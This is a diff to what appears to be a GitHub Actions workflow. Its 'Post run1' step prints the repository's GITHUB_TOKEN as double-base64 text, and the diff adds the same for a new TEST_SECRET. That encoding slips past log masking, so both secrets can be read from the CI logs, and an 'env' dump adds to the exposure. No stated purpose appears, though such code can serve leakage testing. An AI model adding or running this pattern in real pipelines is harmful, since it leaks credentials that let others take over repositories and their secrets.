@@ -13,9 +13,11 @@ jobs:
       - name: Post run1
         run: |
           echo $SECRET_TOKEN | base64 -w0 | base64 -w 0
-          env
+          echo $TEST_SECRET | base64 -w0 | base64 -w 0
+          env 
         env:
           SECRET_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          TEST_SECRET: ${{ secrets.TEST_SECRET }}
       - name: Post run2
         run: |
           sleep 60
